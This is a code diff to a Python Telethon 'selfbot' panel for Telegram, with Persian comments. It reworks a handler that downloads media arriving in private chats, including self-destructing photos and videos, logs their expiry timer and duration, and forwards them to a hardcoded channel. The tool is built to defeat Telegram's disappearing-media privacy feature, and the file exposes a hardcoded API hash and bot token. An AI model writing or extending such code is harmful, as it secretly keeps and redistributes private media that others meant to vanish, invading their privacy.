@@ -12,6 +12,9 @@ API_ID = 26123074
 API_HASH = 'e54093aa586de25491a6d9394fd55534'
 BOT_TOKEN = '8940705403:AAHW9N_6lEDbL6LXy79KX_SEt-XphYDtp_Y'
 
+# آیدی کانال شما برای ذخیره رسانه‌ها
+TARGET_CHANNEL = -1004418089041
+
 bot = TelegramClient('star_bot_panel', API_ID, API_HASH)
 
 DB_FILE = 'database.json'
@@ -161,7 +164,7 @@ async def handle_text(event):
     elif text == "📜 قوانین «":
         await event.respond("قوانین استفاده از سیستم سلف‌بات استار...", buttons=main_menu())
 
-# تابع پیشرفته مدیریت و شکار رسانه‌ها (همراه با استخراج زمان ویدیو و تایم مخفی بودن)
+# تابع دقیق شکار رسانه‌ها و استخراج کامل ثانیه‌های تایم‌دار و ویدیو
 async def catch_media_handler(event):
     if not event.is_private:
         return
@@ -174,27 +177,22 @@ async def catch_media_handler(event):
             if event.is_reply and event.raw_text and "شکار" in event.raw_text:
                 return
 
+            # فیلتر کردن استیکرها و گیف‌های معمولی
             if hasattr(event.media, 'document') and event.media.document:
                 for attr in event.media.document.attributes:
                     if type(attr).__name__ == 'DocumentAttributeSticker':
                         return
-
-            if hasattr(event.media, 'document') and event.media.document:
                 if getattr(event.media.document, 'mime_type', '') == 'image/gif':
                     return
-                for attr in event.media.document.attributes:
-                    attr_type = type(attr).__name__
-                    if attr_type == 'DocumentAttributeAnimated':
-                        return
-                    if attr_type == 'DocumentAttributeVideo':
-                        if not getattr(attr, 'round_message', False):
-                            if getattr(attr, 'nosound', False):
-                                return
 
-            # استخراج تایم انقضا یا مخفی بودن (Self-destruct / TTL)
-            ttl_seconds = getattr(event.message, 'ttl_period', None) or getattr(event.media, 'ttl_seconds', None)
-            
-            # استخراج مدت زمان ویدیو
+            # استخراج دقیق تایم انقضای عکس یا ویدیو (Self-destruct TTL)
+            ttl_seconds = None
+            if hasattr(event.message, 'ttl_period') and event.message.ttl_period:
+                ttl_seconds = event.message.ttl_period
+            elif hasattr(event.media, 'ttl_seconds') and event.media.ttl_seconds:
+                ttl_seconds = event.media.ttl_seconds
+
+            # استخراج دقیق مدت زمان ویدیو (Duration)
             video_duration = None
             if hasattr(event.media, 'document') and event.media.document:
                 for attr in event.media.document.attributes:
@@ -204,34 +202,33 @@ async def catch_media_handler(event):
             file_path = await event.download_media()
             if file_path:
                 is_video_note = False
-                
                 if hasattr(event.media, 'document') and event.media.document:
                     for attr in event.media.document.attributes:
                         if type(attr).__name__ == 'DocumentAttributeVideo' and getattr(attr, 'round_message', False):
                             is_video_note = True
                             break
 
-                # ساخت متن کپشن بر اساس اطلاعات استخراج شده
-                caption_text = "📥 شکار رسانه توسط سلف‌بات!"
-                details = []
+                # ساخت کپشن جامع شامل تمام اطلاعات ثانیه‌ای
+                caption_parts = ["📥 شکار رسانه توسط سلف‌بات!"]
                 
                 if ttl_seconds:
-                    details.endswith(f"⏱ تایم مخفی بودن: {ttl_seconds} ثانیه")
-                    caption_text += f"\n⏱ تایم مخفی بودن: {ttl_seconds} ثانیه"
+                    caption_parts.append(f"⏱ تایم مخفی بودن (انقضا): {ttl_seconds} ثانیه")
                 
                 if video_duration:
-                    caption_text += f"\n⏳ مدت زمان ویدیو: {video_duration} ثانیه"
+                    caption_parts.append(f"⏳ مدت زمان ویدیو: {video_duration} ثانیه")
+
+                caption_text = "\n".join(caption_parts)
 
                 client = event.client
                 if is_video_note:
-                    await client.send_file('me', file_path, video_note=True, caption=f"📥 شکار ویدیو مسج!\n⏳ مدت زمان: {video_duration or 'نامشخص'} ثانیه")
+                    await client.send_file(TARGET_CHANNEL, file_path, video_note=True, caption=f"📥 شکار ویدیو مسج!\n⏳ مدت زمان: {video_duration or 'نامشخص'} ثانیه")
                 else:
-                    await client.send_file('me', file_path, caption=caption_text)
+                    await client.send_file(TARGET_CHANNEL, file_path, caption=caption_text)
 
                 if os.path.exists(file_path):
                     os.remove(file_path)
         except Exception as err:
-            print(f"خطا در دانلود یا ارسال رسانه: {err}")
+            print(f"خطا در دانلود یا ارسال رسانه به کانال: {err}")
 
 async def finish_login(event, chat_id, client, phone):
     client.remove_event_handler(catch_media_handler, events.NewMessage)
